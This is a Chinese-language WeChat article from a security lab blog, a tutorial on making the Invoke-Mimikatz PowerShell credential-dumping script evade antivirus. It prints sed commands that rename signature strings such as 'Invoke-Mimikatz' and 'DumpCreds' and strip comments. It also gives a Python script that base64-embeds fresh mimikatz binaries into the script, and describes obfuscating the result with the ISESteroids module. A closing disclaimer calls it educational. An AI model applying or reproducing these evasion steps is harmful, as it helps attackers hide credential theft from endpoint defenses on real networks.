##  再探mimikatz免杀

原创 鸿鹄实验室a [ 鸿鹄实验室 ](javascript:void\(0\);)

**鸿鹄实验室** ![]()

微信号 gh_a2210090ba3f

功能介绍 鸿鹄实验室，欢迎关注

____

__

收录于话题

    前几天看了tubai师傅的免杀抓密码，这里我也来分享一下mimiktaz的powershell脚本的免杀方法。  

  

测试使用的mimikatz文件地址如下：  

  

https://github.com/BC-
SECURITY/Empire/blob/master/empire/server/data/module_source/credentials/Invoke-
Mimikatz.ps1

  

   首先，关于powershell脚本来说有很多现成的混淆工具(主流免杀方式就是混淆)，比如chameleon、Invoke-
Stealth、Chimera等等，但此类工具在混淆mimikatz时，或多或少会出现部分问题。于是我们这里手工对其进行免杀操作。

  

   先对mimikatz的ps脚本执行基础的字符混淆  

  

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1  
    sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1  
    sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1  
    sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1  
    sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1  
    sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805091251.png)

  

弄完后一些基础的东西就算是混淆完成了，如果你想更新mimikatz，可以使用下面的py脚本进行更新

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    import fileinputimport base64  
      
      
    with open("./mimikatz_trunk/Win32/mimikatz.exe", "rb") as f:    win32 = base64.b64encode(f.read()).decode()  
    with open("./mimikatz_trunk/x64/mimikatz.exe", "rb") as f:    x64 = base64.b64encode(f.read()).decode()  
      
    for line in fileinput.FileInput("./Invoke-Mimikatz.ps1", inplace=1):  
      line = line.rstrip('\r\n')  if "$PEBytes64 = " in line:    print("$PEBytes64 = '" + x64 + "'")  elif "$PEBytes32 = " in line:    print("$PEBytes32 = '" + win32 + "'")  else:    print(line)

  

此时我们的mimikatz并不能绕过杀软，我们需要利用powershell ise自带的功能来进行后续操作  

  

先来安装该模块，命令如下：  

  

  * 

    
    
    Install-Module -Name "ISESteroids" -Scope CurrentUser -Repository PSGallery -Force

  

安装好以后在ise输入  

  

  * 

    
    
     Start-Steroids

  

开启该模块

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805091253.png)

  

然后在工具中选择混淆代码  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805091254.png)

  

混淆即可，此时所有操作已经完成。  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805091255.png)

  
  
  
  
  
     ▼更多精彩推荐，请关注我们▼

  

 **请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805091256.png)

  

  

![]()

鸿鹄实验室a

![赞赏二维码]() **微信扫一扫赞赏作者** 赞赏

已喜欢，[对作者说句悄悄话](javascript:;)

取消 __

#### 发送给作者

发送

最多40字，当前共字

[](javascript:;) 人赞赏

上一页 [1](javascript:;)/3 下一页

长按二维码向我转账

受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

再探mimikatz免杀

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

